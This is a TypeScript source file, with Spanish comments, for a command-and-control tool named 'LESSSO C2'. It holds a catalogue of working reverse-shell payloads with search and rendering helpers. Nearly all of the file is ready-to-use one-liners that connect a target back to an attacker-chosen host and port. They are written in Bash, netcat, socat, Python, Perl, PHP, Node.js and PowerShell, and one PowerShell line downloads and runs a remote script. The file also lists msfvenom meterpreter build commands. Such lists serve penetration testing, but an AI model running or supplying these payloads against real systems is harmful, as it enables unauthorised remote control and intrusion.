// ==========================================================
// LESSSO C2 — Dataset de Reverse Shells
// ----------------------------------------------------------
// Basado en el dataset de revshells.com (open source).
// Placeholders: {LHOST} y {LPORT} se sustituyen en runtime.
//
// Cada shell tiene:
//   - id: identificador único
//   - name: nombre legible
//   - platform: linux | windows | macos | web | other
//   - type: reverse | bind | msf | other
//   - payload: string con {LHOST} y {LPORT}
//   - description: (opcional) notas de uso
//   - tags: (opcional) para búsqueda
//
// Utilidades incluidas:
//   - renderShell(shell, lhost, lport)  → sustituye placeholders
//   - filterShellsByPlatform(platform)  → filtra por SO
//   - searchShells(query)               → búsqueda por nombre/tags
//   - searchShellsFuzzy(query)          → búsqueda fuzzy (bht → bash-tcp)
//   - groupShellsByPlatform()           → agrupa por SO
//   - countShellsByPlatform()           → cuenta por SO (para badges)
//   - getPlatformMeta(platform)         → metadata visual por SO
// ==========================================================

export type ShellPlatform = 'linux' | 'windows' | 'macos' | 'web' | 'other';
export type ShellType = 'reverse' | 'bind' | 'msf' | 'other';

export interface ReverseShell {
  id: string;
  name: string;
  platform: ShellPlatform;
  type: ShellType;
  payload: string;
  description?: string;
  tags?: string[];
}

// ==========================================================
// Metadata visual por plataforma
// ==========================================================
export const PLATFORM_META: Record<ShellPlatform, { label: string; icon: string; color: string }> = {
  linux:   { label: 'Linux',   icon: '🐧', color: 'text-emerald-500' },
  windows: { label: 'Windows', icon: '🪟', color: 'text-blue-500' },
  macos:   { label: 'macOS',   icon: '🍎', color: 'text-slate-500' },
  web:     { label: 'Web',     icon: '🌐', color: 'text-orange-500' },
  other:   { label: 'Otros',   icon: '🔧', color: 'text-slate-400' },
};

// ==========================================================
// SCRIPTING LANGUAGES (Linux / Cross-platform)
// ==========================================================
const LINUX_SHELLS: ReverseShell[] = [
  {
    id: 'bash-tcp',
    name: 'Bash (/dev/tcp)',
    platform: 'linux',
    type: 'reverse',
    payload: `bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`,
    tags: ['bash', 'dev-tcp'],
  },
  {
    id: 'bash-tcp-196',
    name: 'Bash (196 variant)',
    platform: 'linux',
    type: 'reverse',
    payload: `0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196`,
    tags: ['bash', 'dev-tcp'],
  },
  {
    id: 'bash-read-line',
    name: 'Bash (read line)',
    platform: 'linux',
    type: 'reverse',
    payload: `exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done`,
    tags: ['bash', 'dev-tcp'],
  },
  {
    id: 'bash-udp',
    name: 'Bash (UDP)',
    platform: 'linux',
    type: 'reverse',
    payload: `sh -i >& /dev/udp/{LHOST}/{LPORT} 0>&1`,
    tags: ['bash', 'udp'],
  },
  {
    id: 'sh-i',
    name: 'SH',
    platform: 'linux',
    type: 'reverse',
    payload: `sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`,
    tags: ['sh'],
  },
  {
    id: 'nc-mkfifo',
    name: 'Netcat (mkfifo)',
    platform: 'linux',
    type: 'reverse',
    payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f`,
    tags: ['nc', 'netcat', 'mkfifo'],
  },
  {
    id: 'nc-e',
    name: 'Netcat (-e)',
    platform: 'linux',
    type: 'reverse',
    payload: `nc {LHOST} {LPORT} -e /bin/sh`,
    description: 'Solo funciona con versiones antiguas de nc que tienen -e',
    tags: ['nc', 'netcat'],
  },
  {
    id: 'nc-c',
    name: 'Netcat (-c)',
    platform: 'linux',
    type: 'reverse',
    payload: `nc {LHOST} {LPORT} -c /bin/sh`,
    description: 'Solo funciona con nc-openbsd',
    tags: ['nc', 'netcat'],
  },
  {
    id: 'socat',
    name: 'Socat',
    platform: 'linux',
    type: 'reverse',
    payload: `socat tcp-connect:{LHOST}:{LPORT} exec:"bash -li",pty,stderr,setsid,sigint,sane`,
    tags: ['socat'],
  },
  {
    id: 'python3',
    name: 'Python3 (PTY)',
    platform: 'linux',
    type: 'reverse',
    payload: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
    tags: ['python', 'pty'],
  },
  {
    id: 'python3-short',
    name: 'Python3 (short)',
    platform: 'linux',
    type: 'reverse',
    payload: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'`,
    tags: ['python', 'pty'],
  },
  {
    id: 'python2',
    name: 'Python2',
    platform: 'linux',
    type: 'reverse',
    payload: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    tags: ['python'],
  },
  {
    id: 'perl',
    name: 'Perl',
    platform: 'linux',
    type: 'reverse',
    payload: `perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'`,
    tags: ['perl'],
  },
  {
    id: 'ruby',
    name: 'Ruby',
    platform: 'linux',
    type: 'reverse',
    payload: `ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    tags: ['ruby'],
  },
  {
    id: 'php-exec',
    name: 'PHP (exec)',
    platform: 'linux',
    type: 'reverse',
    payload: `php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    tags: ['php'],
  },
  {
    id: 'php-shell-exec',
    name: 'PHP (shell_exec)',
    platform: 'linux',
    type: 'reverse',
    payload: `php -r '$sock=fsockopen("{LHOST}",{LPORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'`,
    tags: ['php'],
  },
  {
    id: 'php-system',
    name: 'PHP (system)',
    platform: 'linux',
    type: 'reverse',
    payload: `php -r '$sock=fsockopen("{LHOST}",{LPORT});system("/bin/sh -i <&3 >&3 2>&3");'`,
    tags: ['php'],
  },
  {
    id: 'php-passthru',
    name: 'PHP (passthru)',
    platform: 'linux',
    type: 'reverse',
    payload: `php -r '$sock=fsockopen("{LHOST}",{LPORT});passthru("/bin/sh -i <&3 >&3 2>&3");'`,
    tags: ['php'],
  },
  {
    id: 'java-runtime',
    name: 'Java (Runtime)',
    platform: 'linux',
    type: 'reverse',
    payload: `Runtime rt = Runtime.getRuntime();\nString[] commands = {"/bin/sh","-c","bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"};\nProcess proc = rt.exec(commands);`,
    description: 'Requiere compilar como .java o usar en JSP',
    tags: ['java'],
  },
  {
    id: 'nodejs',
    name: 'Node.js',
    platform: 'linux',
    type: 'reverse',
    payload: `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({LPORT},"{LHOST}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();`,
    tags: ['node', 'nodejs'],
  },
  {
    id: 'awk',
    name: 'Awk',
    platform: 'linux',
    type: 'reverse',
    payload: `awk 'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
    tags: ['awk'],
  },
  {
    id: 'lua',
    name: 'Lua',
    platform: 'linux',
    type: 'reverse',
    payload: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
    description: 'Requiere LuaSocket instalado',
    tags: ['lua'],
  },
  {
    id: 'golang',
    name: 'Golang',
    platform: 'linux',
    type: 'reverse',
    payload: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{LHOST}:{LPORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,
    tags: ['go', 'golang'],
  },
  {
    id: 'telnet',
    name: 'Telnet',
    platform: 'linux',
    type: 'reverse',
    payload: `TF=$(mktemp -u); mkfifo $TF && telnet {LHOST} {LPORT} 0<$TF | /bin/sh 1>$TF`,
    tags: ['telnet'],
  },
  {
    id: 'openssl',
    name: 'OpenSSL (TLS)',
    platform: 'linux',
    type: 'reverse',
    payload: `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/s; rm /tmp/s`,
    description: 'Conexión cifrada con TLS. Requiere openssl en el target.',
    tags: ['openssl', 'tls', 'encrypted'],
  },
];

// ==========================================================
// WINDOWS SHELLS
// ==========================================================
const WINDOWS_SHELLS: ReverseShell[] = [
  {
    id: 'powershell-tcpclient',
    name: 'PowerShell (TcpClient)',
    platform: 'windows',
    type: 'reverse',
    payload: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    tags: ['powershell'],
  },
  {
    id: 'powershell-tcpclient-b64',
    name: 'PowerShell (Base64)',
    platform: 'windows',
    type: 'reverse',
    payload: `powershell -e <BASE64_ENCODED_PAYLOAD>`,
    description: 'Usa `pwsh` o `powershell` con -EncodedCommand para ejecutar el payload codificado en base64 UTF-16LE. Utiliza el encoder del arsenal para generarlo.',
    tags: ['powershell', 'base64'],
  },
  {
    id: 'powershell-nishang',
    name: 'PowerShell (Nishang)',
    platform: 'windows',
    type: 'reverse',
    payload: `powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://{LHOST}/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}"`,
    description: 'Requiere servir Invoke-PowerShellTcp.ps1 desde {LHOST}.',
    tags: ['powershell', 'nishang'],
  },
  {
    id: 'powershell-conpty',
    name: 'PowerShell (ConPTY)',
    platform: 'windows',
    type: 'reverse',
    payload: `$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    tags: ['powershell', 'conpty'],
  },
  {
    id: 'nc-exe',
    name: 'Netcat.exe',
    platform: 'windows',
    type: 'reverse',
    payload: `nc.exe -e cmd.exe {LHOST} {LPORT}`,
    description: 'Requiere subir nc.exe al target primero.',
    tags: ['nc', 'netcat'],
  },
  {
    id: 'ncat',
    name: 'Ncat (Windows)',
    platform: 'windows',
    type: 'reverse',
    payload: `ncat.exe {LHOST} {LPORT} -e cmd.exe`,
    tags: ['ncat'],
  },
];

// ==========================================================
// METASPLOIT PAYLOADS
// ==========================================================
const MSF_PAYLOADS: ReverseShell[] = [
  {
    id: 'msf-windows-x86',
    name: 'MSF: windows/x86',
    platform: 'windows',
    type: 'msf',
    payload: `msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe`,
    tags: ['msfvenom', 'meterpreter'],
  },
  {
    id: 'msf-windows-x64',
    name: 'MSF: windows/x64',
    platform: 'windows',
    type: 'msf',
    payload: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe`,
    tags: ['msfvenom', 'meterpreter'],
  },
  {
    id: 'msf-linux-x86',
    name: 'MSF: linux/x86',
    platform: 'linux',
    type: 'msf',
    payload: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf`,
    tags: ['msfvenom', 'meterpreter'],
  },
  {
    id: 'msf-linux-x64',
    name: 'MSF: linux/x64',
    platform: 'linux',
    type: 'msf',
    payload: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf`,
    tags: ['msfvenom', 'meterpreter'],
  },
  {
    id: 'msf-macos',
    name: 'MSF: osx',
    platform: 'macos',
    type: 'msf',
    payload: `msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho -o shell.macho`,
    tags: ['msfvenom', 'meterpreter'],
  },
  {
    id: 'msf-php',
    name: 'MSF: PHP',
    platform: 'web',
    type: 'msf',
    payload: `msfvenom -p php/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\\n' > shell.php && pbpaste >> shell.php`,
    tags: ['msfvenom', 'php'],
  },
  {
    id: 'msf-jsp',
    name: 'MSF: JSP',
    platform: 'web',
    type: 'msf',
    payload: `msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.jsp`,
    tags: ['msfvenom', 'jsp'],
  },
  {
    id: 'msf-war',
    name: 'MSF: WAR (Tomcat)',
    platform: 'web',
    type: 'msf',
    payload: `msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war`,
    tags: ['msfvenom', 'war', 'tomcat'],
  },
  {
    id: 'msf-asp',
    name: 'MSF: ASP',
    platform: 'web',
    type: 'msf',
    payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f asp -o shell.asp`,
    tags: ['msfvenom', 'asp'],
  },
  {
    id: 'msf-aspx',
    name: 'MSF: ASPX',
    platform: 'web',
    type: 'msf',
    payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f aspx -o shell.aspx`,
    tags: ['msfvenom', 'aspx'],
  },
  {
    id: 'msf-python',
    name: 'MSF: Python',
    platform: 'linux',
    type: 'msf',
    payload: `msfvenom -p cmd/unix/reverse_python LHOST={LHOST} LPORT={LPORT} -f raw > shell.py`,
    tags: ['msfvenom', 'python'],
  },
  {
    id: 'msf-bash',
    name: 'MSF: Bash',
    platform: 'linux',
    type: 'msf',
    payload: `msfvenom -p cmd/unix/reverse_bash LHOST={LHOST} LPORT={LPORT} -f raw > shell.sh`,
    tags: ['msfvenom', 'bash'],
  },
];

// ==========================================================
// EXPORT AGREGADO
// ==========================================================
export const REVERSE_SHELLS: ReverseShell[] = [
  ...LINUX_SHELLS,
  ...WINDOWS_SHELLS,
  ...MSF_PAYLOADS,
];

// ==========================================================
// UTILIDADES
// ==========================================================

/**
 * Sustituye los placeholders {LHOST} y {LPORT} en el payload
 * de un shell.
 */
export function renderShell(shell: ReverseShell, lhost: string, lport: string): string {
  return shell.payload
    .replace(/\{LHOST\}/g, lhost)
    .replace(/\{LPORT\}/g, lport);
}

/**
 * Filtra los shells por plataforma.
 */
export function filterShellsByPlatform(platform: ShellPlatform | 'all'): ReverseShell[] {
  if (platform === 'all') return REVERSE_SHELLS;
  return REVERSE_SHELLS.filter(s => s.platform === platform);
}

/**
 * Búsqueda lineal simple: matchea si el query está contenido
 * en el nombre, id o tags.
 */
export function searchShells(query: string): ReverseShell[] {
  const q = query.toLowerCase();
  return REVERSE_SHELLS.filter(s =>
    s.name.toLowerCase().includes(q) ||
    s.id.toLowerCase().includes(q) ||
    (s.tags || []).some(t => t.toLowerCase().includes(q))
  );
}

/**
 * Búsqueda fuzzy: cada carácter del query aparece en orden en
 * el nombre, id o tags del shell. Ej: "bht" matchea "bash-tcp".
 *
 * Combina match directo + fuzzy.
 */
export function searchShellsFuzzy(query: string): ReverseShell[] {
  if (!query.trim()) return REVERSE_SHELLS;

  const q = query.toLowerCase();
  const tokens = q.split(/\s+/).filter(Boolean);

  return REVERSE_SHELLS.filter(shell => {
    const searchable = [
      shell.name,
      shell.id,
      shell.platform,
      ...(shell.tags || []),
    ].join(' ').toLowerCase();

    // Todas las "palabras" del query deben matchear
    return tokens.every(token => {
      // 1. Match directo
      if (searchable.includes(token)) return true;
      // 2. Fuzzy: cada carácter del token aparece en orden
      let i = 0;
      for (let j = 0; j < searchable.length && i < token.length; j++) {
        if (searchable[j] === token[i]) i++;
      }
      return i === token.length;
    });
  });
}

/**
 * Agrupa los shells por plataforma.
 */
export function groupShellsByPlatform(): Record<ShellPlatform, ReverseShell[]> {
  const groups: Record<ShellPlatform, ReverseShell[]> = {
    linux: [],
    windows: [],
    macos: [],
    web: [],
    other: [],
  };
  REVERSE_SHELLS.forEach(s => groups[s.platform].push(s));
  return groups;
}

/**
 * Cuenta los shells por plataforma. Útil para badges.
 */
export function countShellsByPlatform(): Record<string, number> {
  const counts: Record<string, number> = {};
  for (const shell of REVERSE_SHELLS) {
    counts[shell.platform] = (counts[shell.platform] || 0) + 1;
  }
  return counts;
}

/**
 * Obtiene la metadata visual de una plataforma.
 */
export function getPlatformMeta(platform: ShellPlatform): { label: string; icon: string; color: string } {
  return PLATFORM_META[platform] || PLATFORM_META.other;
}
